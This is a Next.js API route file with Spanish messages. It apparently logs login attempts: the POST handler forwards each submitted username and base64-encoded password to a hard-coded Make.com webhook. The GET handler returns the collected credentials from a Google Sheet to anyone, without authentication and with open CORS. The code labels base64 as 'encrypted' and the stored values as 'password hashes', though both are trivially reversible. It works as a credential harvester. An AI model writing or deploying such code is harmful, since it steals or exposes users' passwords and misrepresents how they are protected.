import { NextResponse } from "next/server";
import { google } from "googleapis";

const MAKE_WEBHOOK_URL = "https://hook.us2.make.com/xmgvpngmgiemhbdabnzirv7df1lw147e";

export async function POST(request: Request) {
  try {
    const { username, password } = await request.json();

    if (!username || !password) {
      return NextResponse.json(
        { success: false, message: "Faltan datos" },
        { status: 400 }
      );
    }

    const encryptedPassword = Buffer.from(password).toString("base64");

    const fecha = new Date();
    const fechaFormateada = fecha.toLocaleString("es-AR", {
      timeZone: "America/Argentina/Buenos_Aires",
    });

    const payload = {
      usuario: username,
      password: encryptedPassword,
      fecha: fechaFormateada,
    };

    const makeResponse = await fetch(MAKE_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!makeResponse.ok) {
      return NextResponse.json(
        { success: false, message: "Error enviando a Make" },
        { status: 500 }
      );
    }

    return NextResponse.json(
      {
        success: true,
        message: "Registro enviado correctamente",
        data: payload,
      },
      {
        status: 200,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
        },
      }
    );
  } catch (error) {
    console.error("Error en login-records:", error);
    return NextResponse.json(
      { success: false, message: "Error interno del servidor" },
      {
        status: 500,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
        },
      }
    );
  }
}

export async function GET() {
  try {
    const auth = new google.auth.GoogleAuth({
      credentials: {
        client_email: process.env.GS_CLIENT_EMAIL,
        private_key: process.env.GS_PRIVATE_KEY?.replace(/\\n/g, "\n"),
      },
      scopes: ["https://www.googleapis.com/auth/spreadsheets.readonly"],
    });

    const sheets = google.sheets({ version: "v4", auth });

    const res = await sheets.spreadsheets.values.get({
      spreadsheetId: process.env.GS_SHEET_ID,
      range: "Hoja1!A:C",
    });

    const rows = res.data.values || [];

    const parsed = rows.slice(1).map((r, idx) => ({
      id: idx + "",
      userEmail: r[0],
      passwordHash: r[1],
      loggedAt: r[2],
    }));

    return NextResponse.json(parsed);
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Error leyendo Google Sheets" }, { status: 500 });
  }
}

export async function OPTIONS() {
  return NextResponse.json(
    {},
    {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
      },
    }
  );
}
